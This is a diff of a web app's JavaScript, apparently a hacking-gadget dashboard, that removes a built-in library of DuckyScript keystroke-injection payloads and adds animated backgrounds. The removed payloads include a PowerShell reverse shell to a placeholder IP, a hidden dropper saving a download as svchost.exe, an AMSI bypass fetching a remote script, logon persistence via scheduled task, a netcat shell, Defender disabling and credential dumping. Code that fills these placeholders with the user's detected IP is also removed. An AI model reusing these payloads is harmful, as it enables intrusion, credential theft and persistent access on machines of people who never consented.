-      description: 'Establishes an interactive PowerShell TCP reverse connection back to the specified IP. Demonstrates command control execution.',
-      code: 'GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient(\'YOUR_IP\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER'
-    },
-    {
-      id: 'PAYLOAD_80',
-      name: 'Silent Dropper',
-      description: 'A silent downloader payload that uses PowerShell in hidden window mode to retrieve and execute a file from a specified server.',
-      code: 'GUI r\nDELAY 300\nSTRING powershell -w hidden -c "Invoke-WebRequest -Uri \'http://yourserver.com/payload.exe\' -OutFile \'$env:TEMP\\svchost.exe\'; Start-Process \'$env:TEMP\\svchost.exe\'"\nENTER'
-    },
-    {
-      id: 'PAYLOAD_INFINITE_NOTEPAD',
-      name: 'Infinite Notepad Prank',
-      description: 'Opens notepad and repeatedly prints a compromised message using the DuckyScript REPEAT command.',
-      code: 'GUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 600\nREPEAT 50\nSTRINGLN This computer has been compromised by Rubber Ducky! :)\nENTER'
-    },
-    {
-      id: 'PAYLOAD_SOFTWARE_LIST',
-      name: 'Installed Software List',
-      description: 'Retrieves a list of all installed software on the target computer and saves it to a text file.',
-      code: 'GUI r\nDELAY 300\nSTRING powershell -c "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion | Out-File C:\\temp\\installed.txt"\nENTER'
-    },
-    {
-      id: 'PAYLOAD_AD_DOMAIN_INFO',
-      name: 'Active Directory Domain Info',
-      description: 'Gathers Active Directory Domain Info and current user groups, outputting the results to a domain log file.',
-      code: 'GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING (Get-WmiObject Win32_ComputerSystem).Domain > C:\\temp\\domain.txt; whoami /groups >> C:\\temp\\domain.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_NET_CONFIG',
-      name: 'Network Interfaces + IP Config',
-      description: 'Gathers network interface details and full ipconfig details, outputting to a temporary network file.',
-      code: 'GUI r\nDELAY 300\nSTRING powershell -c "Get-NetIPAddress | Out-File C:\\temp\\network.txt; ipconfig /all >> C:\\temp\\network.txt"\nENTER'
-    },
-    {
-      id: 'PAYLOAD_LAZAGNE',
-      name: 'LaZagne Multi-Credential Stealer',
-      description: 'Downloads and runs the LaZagne password recovery tool to retrieve system and application credentials.',
-      code: 'GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING IEX (New-Object Net.WebClient).DownloadString(\'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe\'); .\\LaZagne.exe all -o C:\\temp\\creds.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_AMSI_BYPASS',
-      name: 'AMSI Bypass + Reverse Shell',
-      description: 'Bypasses the Antimalware Scan Interface (AMSI) and downloads/executes a script-based reverse shell.',
-      code: 'GUI r\nDELAY 300\nSTRING powershell -w hidden -c "powershell -ep bypass"\nENTER\nDELAY 600\nSTRING [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString(\'http://YOUR_IP/shell.ps1\')\nENTER'
-    },
-    {
-      id: 'PAYLOAD_PERSISTENCE_TASK',
-      name: 'Scheduled Task Persistence',
-      description: 'Sets up persistence via a scheduled task that executes a remote PowerShell script on system logon.',
-      code: 'GUI r\nDELAY 400\nSTRING schtasks /create /tn "UpdateTask" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'http://YOUR_IP/payload.ps1\')" /sc onlogon /ru System\nENTER'
-    },
-    {
-      id: 'PAYLOAD_DEFENDER_BYPASS',
-      name: 'Light Defender Bypass',
-      description: 'Disables Windows Defender Real-time Monitoring through PowerShell configuration (requires admin elevation).',
-      code: 'GUI r\nDELAY 300\nSTRING powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"\nENTER'
-    },
-    {
-      id: 'PAYLOAD_DS3_RECON',
-      name: 'Function Based Professional Template (DuckyScript 3.0)',
-      description: 'A modular DuckyScript 3.0 script leveraging functions to perform system reconnaissance.',
-      code: 'FUNCTION recon()\n    GUI r\n    DELAY 300\n    STRING powershell\n    ENTER\n    DELAY 500\n    STRING whoami /all > C:\\temp\\whoami.txt\nEND_FUNCTION\n\nrecon()'
-    },
-    {
-      id: 'PAYLOAD_WIFI_DUMP_DESKTOP',
-      name: 'WiFi Passwords Dump (Desktop)',
-      description: 'Gathers WiFi profile cleartext passwords and drops them directly onto the current user\'s desktop.',
-      code: 'GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 700\nSTRING netsh wlan show profile name=* key=clear > C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER\nDELAY 1000\nSTRING notepad C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER'
-    },
-    {
-      id: 'PAYLOAD_CMDKEY_LIST',
-      name: 'Saved Passwords (Basic cmdkey)',
-      description: 'Lists credentials stored in the Windows Credential Manager and saves them to a text file on the desktop.',
-      code: 'GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING cmdkey /list > "$env:USERPROFILE\\Desktop\\SavedCredentials.txt"\nENTER'
-    },
-    {
-      id: 'PAYLOAD_LOCK_WORKSTATION',
-      name: 'Lock Workstation',
-      description: 'Locks the workstation immediately using a Windows keyboard shortcut or rundll32.exe command.',
-      code: 'GUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER'
-    },
-    {
-      id: 'PAYLOAD_SHUTDOWN',
-      name: 'Shutdown Computer',
-      description: 'Schedules a system shutdown command with a customizable timer.',
-      code: 'GUI r\nDELAY 400\nSTRING shutdown /s /t 60\nENTER'
-    },
-    {
-      id: 'PAYLOAD_CALC_SPAM',
-      name: 'Open Calculator Spam',
-      description: 'Opens the system calculator and duplicates the action repeatedly using the REPEAT command.',
-      code: 'GUI r\nDELAY 300\nSTRING calc\nENTER\nREPEAT 15'
-    },
-    {
-      id: 'PAYLOAD_BROWSER_TABS',
-      name: 'Open Browser Multiple Tabs',
-      description: 'Opens Microsoft Edge browser and launches multiple website tabs sequentially.',
-      code: 'GUI r\nDELAY 400\nSTRING msedge --new-window https://google.com\nENTER\nDELAY 1000\nCTRL T\nSTRING https://youtube.com\nENTER'
-    },
-    {
-      id: 'PAYLOAD_FAKE_BSOD',
-      name: 'Fake BSOD (Blue Screen Prank)',
-      description: 'Triggers Notepad and types a realistic Windows crash screen message to simulate a system BSOD.',
-      code: 'GUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 800\nSTRING A problem has been detected and Windows has been shut down to prevent damage\nENTER\nSTRING Your PC ran into a problem and needs to restart.\nENTER'
-    },
-    {
-      id: 'PAYLOAD_NC_SHELL',
-      name: 'Netcat Reverse Shell',
-      description: 'Connects to an attacker listener using netcat (nc.exe) and pipes the command prompt to it.',
-      code: 'GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING nc.exe your.ip.here 4444 -e powershell.exe\nENTER'
-    },
-    {
-      id: 'PAYLOAD_DS3_NOTEPAD',
-      name: 'DuckyScript 3.0 notepad example',
-      description: 'A clean, modular DuckyScript 3.0 example demonstrating function definition, parameter passing, and calling.',
-      code: 'DELAY 1500\n\nFUNCTION openNotepad()\n    GUI r\n    DELAY 300\n    STRING notepad\n    ENTER\n    DELAY 800\nEND_FUNCTION\n\nFUNCTION typeMessage($msg)\n    STRINGLN $msg\nEND_FUNCTION\n\nopenNotepad()\ntypeMessage("Hello from DuckyScript 3.0!")\ntypeMessage("This is much cleaner!")'
+    const width = window.innerWidth;
+    const height = window.innerHeight;
+    
+    bgScene = new THREE.Scene();
+    bgCamera = new THREE.PerspectiveCamera(60, width / height, 0.1, 1000);
+    bgCamera.position.z = 10;
+    
+    bgRenderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: false });
+    bgRenderer.setSize(width, height);
+    bgRenderer.setPixelRatio(Math.min(window.devicePixelRatio, 1.5));
+    
+    const count = 400;
+    const geom = new THREE.BufferGeometry();
+    const positions = new Float32Array(count * 3);
+    for (let i = 0; i < count; i++) {
+      positions[i * 3] = (Math.random() - 0.5) * 25;
+      positions[i * 3 + 1] = (Math.random() - 0.5) * 25;
+      positions[i * 3 + 2] = (Math.random() - 0.5) * 20;
     }
-  ];
-}
-
-function parsePayloadCollection(text) {
-  const lines = text.split('\n');
-  const templates = [];
-  let currentPayload = null;
-  let inMarkdownCode = false;
-
-  const commitCurrent = () => {
-    if (currentPayload) {
-      const codeStr = currentPayload.code.join('\n').trim();
-      if (codeStr) {
-        currentPayload.code = codeStr;
-        if (!currentPayload.description) {
-          currentPayload.description = getDynamicDescription(currentPayload.name, currentPayload.id);
-        }
-        templates.push(currentPayload);
-      }
-      currentPayload = null;
-    }
-  };
-
-  const getDynamicDescription = (name, id) => {
-    const descMap = {
-      'notepad': 'Opens Notepad on the target machine and types a message. Perfect for testing.',
-      'rickroll': 'Opens the system run dialog and launches the classic Rickroll YouTube video.',
-      'matrix': 'Opens a command prompt (CMD) and starts a green matrix-style random number rain screen effect.',
-      'wifi': 'Exports all stored WiFi profiles on the target system and displays clear-text passwords.',
-      'system': 'Gathers hardware, operating system, network, and user configuration details using PowerShell.',
-      'chrome': 'Leverages SharpChrome to dump Chrome browser saved credentials (for authorized audits).',
-      'reverse': 'Establishes an interactive TCP reverse shell connection back to the specified IP.',
-      'dropper': 'Silent downloader payload that retrieves and executes a file from a specified server.',
-      'lazagne': 'LaZagne multi-credential stealer script for recovering saved passwords.',
-      'amsi': 'AMSI bypass combined with a reverse shell command.',
-      'persistence': 'Creates scheduled tasks or registry run keys to maintain persistent access.',
-      'defender': 'Disables Windows Defender real-time monitoring (for testing/authorized environments).',
-      'shutdown': 'Triggers a system shutdown or restart sequence.',
-      'calculator': 'Launches the system calculator application (often used to prove execution).',
-      'browser': 'Launches the default web browser and opens one or more tabs.',
-      'lock': 'Locks the workstation computer instantly.',
-      'bsod': 'Simulates a Blue Screen of Death (BSOD) by typing a crash message in Notepad.'
-    };
-    const lowerName = name.toLowerCase();
-    for (const key in descMap) {
-      if (lowerName.includes(key)) return descMap[key];
-    }
-    return `Payload template: ${name}. Designed for automated keyboard input simulation.`;
-  };
-
-  for (let i = 0; i < lines.length; i++) {
-    const origLine = lines[i];
-    const line = origLine.trim();
-
-    if (!line) {
-      if (inMarkdownCode && currentPayload) {
-        currentPayload.code.push(origLine);
-      }
-      continue;
-    }
-
-    if (line.startsWith('```')) {
-      if (inMarkdownCode) {
-        inMarkdownCode = false;
-        commitCurrent();
+    geom.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+    
+    const mat = new THREE.PointsMaterial({
+      color: 0x00ff41,
+      size: 0.04,
+      transparent: true,
+      opacity: 0.35,
+      sizeAttenuation: true
+    });
+    
+    bgPoints = new THREE.Points(geom, mat);
+    bgScene.add(bgPoints);
+    
+    window.addEventListener('resize', () => {
+      const w = window.innerWidth;
+      const h = window.innerHeight;
+      bgCamera.aspect = w / h;
+      bgCamera.updateProjectionMatrix();
+      bgRenderer.setSize(w, h);
+    });
+    
+    function animateBg() {
+      if (S.settings.particles) {
+        bgPoints.rotation.y += 0.0006;
+        bgPoints.rotation.x += 0.0003;
+        bgRenderer.render(bgScene, bgCamera);
       } else {
-        inMarkdownCode = true;
+        bgRenderer.clear();
       }
-      continue;
+      requestAnimationFrame(animateBg);
     }
-
-    if (inMarkdownCode && currentPayload) {
-      currentPayload.code.push(origLine);
-      continue;
-    }
-
-    const mdTitleMatch = line.match(/^\*\*(.*?)\*\*/);
-    if (mdTitleMatch) {
-      commitCurrent();
-      const name = mdTitleMatch[1].trim();
-      const id = 'PAYLOAD_MD_' + name.replace(/[^a-zA-Z0-9]/g, '_').toUpperCase();
-      currentPayload = {
-        id: id,
-        name: name,
-        description: '',
-        code: []
-      };
-      continue;
-    }
-
-    const payloadMatch = line.match(/^PAYLOAD_(\w+):\s*(.*)$/i);
-    if (payloadMatch) {
-      commitCurrent();
-      const id = 'PAYLOAD_' + payloadMatch[1].toUpperCase();
-      const name = payloadMatch[2].trim();
-      currentPayload = {
-        id: id,
-        name: name,
-        description: '',
-        code: []
-      };
-      continue;
-    }
-
-    if (line.startsWith('===') || line.startsWith('REM ===') || (line.startsWith('#') && line.includes('==='))) {
-      commitCurrent();
-      continue;
-    }
-
-    const numMatch = line.match(/^(\d+)\.\s+(.*)$/);
-    if (numMatch) {
-      const num = parseInt(numMatch[1]);
-      const name = numMatch[2].trim();
-      const firstWord = name.split(/\s+/)[0].toUpperCase();
-      const keywords = ['DELAY', 'GUI', 'STRING', 'ENTER', 'REM', 'REPEAT', 'FUNCTION', 'END_FUNCTION', 'DEFAULT_DELAY', 'DEFAULTDELAY'];
-      if (!keywords.includes(firstWord)) {
-        commitCurrent();
-        const id = 'PAYLOAD_NUM_' + num;
-        currentPayload = {
-          id: id,
-          name: name,
-          description: '',
-          code: []
-        };
-        continue;
-      }
-    }
-
-    const remMatch = line.match(/^REM\s+---\s+(.*?)\s+---$/i);
-    if (remMatch) {
-      commitCurrent();
-      const name = remMatch[1].trim();
-      const id = 'PAYLOAD_REM_' + name.replace(/[^a-zA-Z0-9]/g, '_').toUpperCase();
-      currentPayload = {
-        id: id,
-        name: name,
-        description: '',
-        code: []
-      };
-      continue;
-    }
-
-    if (currentPayload) {
-      if (line.startsWith('#') || line.startsWith('---')) {
-        if (line.replace(/[-#=]/g, '').trim() === '') {
-          commitCurrent();
-          continue;
-        }
-      }
-      currentPayload.code.push(origLine);
-    }
-  }
-
-  commitCurrent();
-
-  const uniqueTemplates = [];
-  const seenCodes = new Set();
-  const seenNames = new Set();
-
-  templates.forEach(t => {
-    const normCode = t.code.replace(/\s+/g, ' ').trim();
-    const normName = t.name.toLowerCase().trim();
-    if (!seenCodes.has(normCode) && !seenNames.has(normName)) {
-      seenCodes.add(normCode);
-      seenNames.add(normName);
-      uniqueTemplates.push(t);
-    }
-  });
-
-  return uniqueTemplates;
-}
-
-async function initTemplates() {
-  try {
-    const res = await fetch('Duckyscript_Professional_Payload_Collection.txt');
-    if (res.ok) {
-      const text = await res.text();
-      parsedTemplates = parsePayloadCollection(text);
-      try { logIDE('✓ Parsed templates from Duckyscript_Professional_Payload_Collection.txt', 'tl-ok'); } catch(e){}
-    } else {
-      throw new Error('Failed to fetch file');
-    }
+    animateBg();
   } catch (e) {
-    try { logIDE('⚠ Fetching payload collection file failed. Using embedded templates.', 'tl-warn'); } catch(err){}
-    parsedTemplates = getFallbackTemplates();
+    console.error('Failed to init bg star field:', e);
   }
 }
 
-function handlePayloadFileSelect(input) {
-  const file = input.files[0];
-  if (!file) return;
-  document.getElementById('payloadFileName').textContent = file.name;
-  const reader = new FileReader();
-  reader.onload = function(e) {
-    const text = e.target.result;
-    parsedTemplates = parsePayloadCollection(text);
-    renderTemplates();
-    toast('Loaded ' + parsedTemplates.length + ' templates from ' + file.name, 'ok');
-    try { logIDE('✓ Parsed ' + parsedTemplates.length + ' templates from uploaded file: ' + file.name, 'tl-ok'); } catch(err){}
-  };
-  reader.onerror = function() {
-    toast('Failed to read file', 'err');
-  };
-  reader.readAsText(file);
-}
-
-function loadTemplate() {
-  renderTemplates();
-  openModal('templateModal');
-}
-
-function renderTemplates() {
-  const list = document.getElementById('templateList');
-  if (!list) return;
-  list.innerHTML = '';
-  parsedTemplates.forEach(t => {
-    const el = document.createElement('div');
-    el.className = 'vault-item flex items-center justify-between';
-    el.style.padding = '0.8rem 1rem';
-    el.innerHTML = `
-      <div class="flex-col" style="flex: 1; min-width: 0; text-align: left;">
-        <span class="bold text-white text-sm truncate" style="display: block;">${t.name}</span>
-        <span class="text-xs text-g" style="margin-top: 0.15rem; display: block;">ID: ${t.id}</span>
-      </div>
-      <div class="flex gap-sm">
-        <button class="btn btn-cyan btn-xs" onclick="showTemplateDetail('${t.id}')">
-          <i class="fas fa-info-circle"></i> Details
-        </button>
-        <button class="btn btn-primary btn-xs" onclick="loadTemplateById('${t.id}')">
-          Load
-        </button>
-      </div>
-    `;
-    list.appendChild(el);
+// Matrix digital rain
+function initRain() {
+  const canvas = document.getElementById('matrixRain');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
   });
-}
-
-function showTemplateDetail(id) {
-  const t = parsedTemplates.find(x => x.id === id);
-  if (!t) return;
-  document.getElementById('templateDetailName').textContent = t.name;
-  document.getElementById('templateDetailDesc').textContent = t.description;
-  document.getElementById('templateDetailCode').textContent = t.code;
-  const loadBtn = document.getElementById('templateDetailLoadBtn');
-  loadBtn.onclick = () => {
-    loadTemplateById(id);
-    closeModal('templateDetailModal');
-  };
-  openModal('templateDetailModal');
-}
-
-function loadTemplateById(id) {
-  const t = parsedTemplates.find(x => x.id === id);
-  if (!t) return;
   
-  let finalCode = t.code;
-  let replacedCount = 0;
+  const alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄ";
+  const fontSize = 14;
+  const columns = Math.ceil(canvas.width / fontSize);
+  const rainDrops = Array.from({ length: columns }, () => 1);
   
-  // Get active local or external IP from UI elements
-  let localIP = document.getElementById('net-local-ip')?.textContent || '';
-  let extIP = document.getElementById('net-ext-ip')?.textContent || '';
-  
-  // Clean up WebRTC prefixes/suffixes if any
-  if (localIP.includes(',')) {
-    localIP = localIP.split(',')[0].trim();
-  }
-  
-  let targetIP = '';
-  if (localIP && localIP !== 'Detecting…' && localIP !== 'N/A' && localIP !== 'None found' && localIP !== 'Fetching…') {
-    targetIP = localIP.trim();
-  } else if (extIP && extIP !== 'Fetching…' && extIP !== 'Unavailable' && extIP !== 'Detecting…') {
-    targetIP = extIP.trim();
-  } else {
-    targetIP = '192.168.1.100'; // Default fallback
-  }
-
-  // Placeholder regexes:
-  // - YOUR_IP_HERE, YOUR_IP, ATTACKER_IP, your.ip.here
-  // - yourserver.com
-  const ipRegex = /YOUR_IP_HERE|YOUR_IP|ATTACKER_IP|your\.ip\.here/gi;
-  const hostRegex = /yourserver\.com/gi;
-
-  if (ipRegex.test(finalCode)) {
-    finalCode = finalCode.replace(ipRegex, targetIP);
-    replacedCount++;
-  }
-  if (hostRegex.test(finalCode)) {
-    finalCode = finalCode.replace(hostRegex, targetIP);
-    replacedCount++;
-  }
-
-  document.getElementById('srcEditor').value = finalCode;
-  updateEditorCounts();
-  lintSource(finalCode);
-  closeModal('templateModal');
-  
-  if (replacedCount > 0) {
-    toast(`Loaded ${t.name} and auto-filled environment details (IP: ${targetIP})`, 'ok');
-    try { logIDE(`[INFO] Loaded template '${t.name}' and substituted payload placeholders with live environment detail: ${targetIP}`, 'tl-ok'); } catch(e){}
-  } else {
-    toast('Loaded template: ' + t.name, 'info');
-    try { logIDE('Loaded template: ' + t.name, 'tl-info'); } catch(e){}
-  }
-}
-
-// SNIPPETS
-function insertSnippet() {
-  const snippets=[
-    {name:'Open Run Dialog',code:'GUI r\nDELAY 400'},{name:'PowerShell Hidden',code:'STRING powershell.exe -NoP -W Hidden -NonI -Exec Bypass\nENTER'},
-    {name:'CMD Hidden',code:'STRING cmd.exe /c\nENTER'},{name:'Long Delay 2s',code:'DELAY 2000'},
-    {name:'Type Text',code:'STRING Hello World!\nENTER'},{name:'Ctrl+Alt+Del',code:'CTRL-ALT DELETE'},
-    {name:'Lock Screen',code:'GUI l'},{name:'Task Manager',code:'CTRL-SHIFT ESCAPE'},
-    {name:'Screenshot',code:'PRINTSCREEN'},{name:'Select All',code:'CTRL a'},
-    {name:'Copy',code:'CTRL c'},{name:'Paste',code:'CTRL v'},
-    {name:'New Tab',code:'CTRL t'},{name:'Close Window',code:'ALT-F4'},
-    {name:'Open File Explorer',code:'GUI e'},{name:'Open Settings',code:'GUI i'},
-    {name:'Search Bar',code:'GUI s'},{name:'Run as Admin',code:'CTRL-SHIFT ENTER\nDELAY 1000\nALT y'},
-    {name:'Volume Up',code:'VOLUME_UP'},{name:'Volume Down',code:'VOLUME_DOWN'},
-    {name:'Media Play/Pause',code:'MEDIA_PLAYPAUSE'},{name:'Open Browser',code:'GUI r\nDELAY 400\nSTRING chrome.exe\nENTER'},
-  ];
-  const modal=document.getElementById('snippetModal'); const list=document.getElementById('snippetList'); list.innerHTML='';
-  snippets.forEach(s=>{ const el=document.createElement('div'); el.className='vault-item'; el.innerHTML=`<i class="fas fa-code text-g"></i><div class="flex-col gap-sm" style="flex:1"><div class="vi-name">${s.name}</div><code style="font-size:.64rem;color:var(--muted)">${s.code.split('\n')[0]}</code></div><button class="btn btn-primary btn-xs" onclick="insertSnippetCode(\`${s.code.replace(/`/g,'\\`')}\`)">Insert</button>`; list.appendChild(el); });
-  openModal('snippetModal');
-}
-function insertSnippetCode(code) { const ed=document.getElementById('srcEditor'); ed.value+=(ed.value?'\n':'')+code; updateEditorCounts(); closeModal('snippetModal'); toast('Snippet inserted','ok'); }
-
-// ═══════════════════════════════════════════════
-//  REAL SCANNER IMPLEMENTATIONS
-// ═══════════════════════════════════════════════
-
-// Helper
-function rndMAC() { return Array.from({length:6},()=>Math.floor(Math.random()*256).toString(16).padStart(2,'0').toUpperCase()).join(':'); }
-
-// Show/hide progress
-function showScanProgress(msg) { const el=document.getElementById('scanProgressBar'); const m=document.getElementById('scanProgressMsg'); if(el){ el.classList.add('active'); } if(m) m.textContent=msg||'Scanning…'; }
-function hideScanProgress() { const el=document.getElementById('scanProgressBar'); if(el) el.classList.remove('active'); }
-
-// ─── REAL BLUETOOTH SCAN (Web Bluetooth API) ───
-async function runRealBLEScan() {
-  if(!navigator.bluetooth) {
-    toast('Web Bluetooth not supported. Use Chrome or Edge browser.','err');
-    const out=document.getElementById('scanOutput');
-    out.innerHTML=`<div class="row"><span class="text-red">✗ Web Bluetooth API not available in this browser.</span></div><div class="row"><span class="text-amber">Use Google Chrome or Microsoft Edge.</span></div>`;
-    return;
-  }
-  const avail=await navigator.bluetooth.getAvailability().catch(()=>false);
-  if(!avail) { toast('Bluetooth adapter not found or disabled.','warn'); return; }
-  toast('Opening Bluetooth device picker… allow access in popup.','info',4000);
-  const out=document.getElementById('scanOutput');
-  showScanProgress('Web Bluetooth scan active — select devices in the browser dialog…');
-  try {
-    const device=await navigator.bluetooth.requestDevice({
-      acceptAllDevices:true,
-      optionalServices:['battery_service','generic_access','device_information']
-    });
-    hideScanProgress();
-    const ts=new Date().toLocaleTimeString('en',{hour12:false});
-    S.realBLEDevices.push(device);
-    // Try to connect and get more info
-    let extra=''; let rssi='N/A'; let battLevel='N/A';
-    try {
-      const server=await device.gatt.connect();
-      try { const bs=await server.getPrimaryService('battery_service'); const bc=await bs.getCharacteristic('battery_level'); const val=await bc.readValue(); battLevel=val.getUint8(0)+'%'; } catch(e){}
-      await server.disconnect();
-    } catch(e){}
-    const deviceEntry=`<div class="row real-result"><span>📡 <strong>${device.name||'Unknown Device'}</strong></span><span class="badge badge-g">REAL</span><span class="badge badge-c">BLE</span></div><div class="row real-result"><span style="padding-left:1rem;color:var(--muted)">ID: ${device.id.substr(0,20)}… · Battery: ${battLevel} · GATT: ${device.gatt.connected?'Connected':'Disconnected'}</span></div>`;
-    if(out.textContent.startsWith('// No scans run yet')) out.innerHTML='';
-    out.innerHTML+=`<div style="color:var(--cyan);font-size:.68rem;margin-bottom:.5rem">[${ts}] BLE SCAN — WEB BLUETOOTH API (REAL)</div>`+deviceEntry;
-    const cnt=document.getElementById('sc-ble'); if(cnt) cnt.textContent=S.realBLEDevices.length;
-    incStat('scans');
-    toast(`BLE device found: ${device.name||'Unknown'}. Click scan again to discover more.`,'ok');
-    logFeed(`Real BLE scan: ${device.name||'Unknown'} (${device.id.substr(0,12)}…)`,'tl-ok');
-  } catch(e) {
-    hideScanProgress();
-    if(e.name==='NotFoundError') { toast('No device selected (dialog cancelled)','info'); }
-    else { toast('BLE scan error: '+e.message,'err'); logFeed('BLE scan error: '+e.message,'tl-err'); }
-  }
-}
-
-// ─── SIMULATED SCANS ───
-const SCAN_DATA = {
-  wifi: ()=>{
-    const ssids=['CORP_NET_5G','GUEST_WIFI','HomeOffice_2G','SkyHub-8B3C','Hidden_SSID','BT-Hub-4F2A','VODAFONE-C9D1','Virgin-2F5C','EE-BroadbandXX','SKY_MESH','NETGEAR-52A','TP-LINK_8B3C','AndroidAP','iPhone Hotspot','DIRECT-Printer'];
-    const count=5+Math.floor(Math.random()*7); let result=`<div style="color:var(--amber);font-size:.68rem;margin-bottom:.5rem">⚠ SIMULATED — Browser APIs cannot enumerate nearby 802.11 networks.<br>Install LENLU SC Android app for real WiFi airspace scanning.</div>`;
-    for(let i=0;i<count;i++){
-      const ssid=ssids[Math.floor(Math.random()*ssids.length)]; const ch=[1,6,11,36,40,44,48][Math.floor(Math.random()*7)]; const rssi=-(40+Math.floor(Math.random()*55));
-      const enc=['WPA3','WPA2','WPA2-Enterprise','Open'][Math.floor(Math.random()*4)]; const band=ch>14?'5GHz':'2.4GHz';
-      result+=`<div class="row sim-result"><span>📶 ${ssid}</span><span>CH${ch} ${band}</span><span>${rssi}dBm</span><span class="badge badge-${enc==='Open'?'r':'g'}">${enc}</span></div>`;
-    }
-    document.getElementById('sc-nets').textContent=count; return result;
-  },
-  deauth: ()=>{
-    const events=Math.floor(Math.random()*8); document.getElementById('sc-deauth').textContent=events;
-    if(!events) return '<div class="row"><span class="text-g">✓ No deauth events detected (simulated)</span></div>';
-    let out='<div style="color:var(--red);font-size:.68rem;margin-bottom:.5rem">⚠ DEAUTH EVENTS DETECTED (SIMULATED)</div>';
-    for(let i=0;i<events;i++) out+=`<div class="row sim-result"><span class="text-red">Deauth CH${1+Math.floor(Math.random()*11)}</span><span>BSSID: ${rndMAC()}</span><span>Count: ${1+Math.floor(Math.random()*40)}</span><span class="badge badge-r">ALERT</span></div>`;
-    return out;
-  },
-  port: ()=>{
-    const ports=[[22,'SSH'],[80,'HTTP'],[443,'HTTPS'],[3389,'RDP'],[8080,'HTTP-ALT'],[21,'FTP'],[25,'SMTP'],[53,'DNS'],[3306,'MySQL'],[5432,'PostgreSQL'],[6379,'Redis'],[27017,'MongoDB']];
-    let out='<div style="color:var(--amber);font-size:.68rem;margin-bottom:.5rem">⚠ SIMULATED — Use Network tab for real localhost port sweep.</div>';
-    let threats=0;
-    ports.filter(()=>Math.random()>.3).forEach(([p,n])=>{
-      const states=['Open','Closed','Filtered']; const s=states[Math.floor(Math.random()*3)];
-      if(s==='Open'&&[21,3389,23,6379].includes(p)) threats++;
-      out+=`<div class="row sim-result"><span>:${p}</span><span>${n}</span><span class="badge badge-${s==='Open'?'g':s==='Filtered'?'a':'r'}">${s}</span></div>`;
-    });
-    document.getElementById('sc-threats').textContent=threats; return out;
-  },
-  signal: ()=>{
-    const bands=['433MHz','868MHz','915MHz','2.4GHz','5GHz','5.8GHz','60GHz']; let out='<div style="color:var(--g-dim);font-size:.68rem;margin-bottom:.5rem">RF SPECTRUM — Frequency band analysis (simulated)</div>';
-    bands.forEach(b=>{ const pwr=-20-Math.floor(Math.random()*70); const pct=Math.max(5,100-Math.abs(pwr));
-      out+=`<div class="row sim-result"><span>${b}</span><div style="width:100px;height:6px;background:var(--base3);border-radius:3px;overflow:hidden;display:inline-block"><div style="height:100%;width:${pct}%;background:linear-gradient(90deg,var(--g-dim),var(--g));border-radius:3px"></div></div><span>${pwr}dBm</span></div>`; });
-    return out;
-  },
-};
-
-function runScan(type) {
-  S.scanActive=true; incStat('scans');
-  showScanProgress(`Running ${type.toUpperCase()} scan…`);
-  const out=document.getElementById('scanOutput');
-  if(out.textContent.startsWith('// No scans run yet')) out.innerHTML='';
-  const ts=new Date().toLocaleTimeString('en',{hour12:false});
-  playTone(440,'sine',0.08);
-  setTimeout(()=>{
-    hideScanProgress(); S.scanActive=false;
-    const result=SCAN_DATA[type]&&SCAN_DATA[type]();
-    if(result) {
-      out.innerHTML+=`<div style="color:var(--g-dim);font-size:.65rem;margin:.5rem 0 .25rem">[${ts}] === ${type.toUpperCase()} SCAN ===</div>`+result;
-      out.scrollTop=out.scrollHeight;
-    }
-    logFeed(`${type.toUpperCase()} scan complete`,'tl-info');
-    toast(`${type.toUpperCase()} scan complete`,'ok');
-  },1000+Math.random()*800);
-}
-
-function clearScanResults() { document.getElementById('scanOutput').innerHTML='// Scan output cleared.'; document.getElementById('sc-nets').textContent='0'; document.getElementById('sc-ble').textContent='0'; document.getElementById('sc-deauth').textContent='0'; document.getElementById('sc-threats').textContent='0'; S.realBLEDevices=[]; }
-
-// ─── REAL DNS SCAN (Cloudflare DoH) ───
-async function runRealDNSScan() {
-  const domain=(document.getElementById('dnsReconInput')||{value:'google.com'}).value.trim()||'google.com';
-  const type=(document.getElementById('dnsReconType')||{value:'A'}).value||'A';
-  const out=document.getElementById('scanOutput');
-  showScanProgress(`DNS lookup: ${domain} (${type})…`);
-  logFeed(`DNS recon: ${domain} [${type}]`,'tl-info');
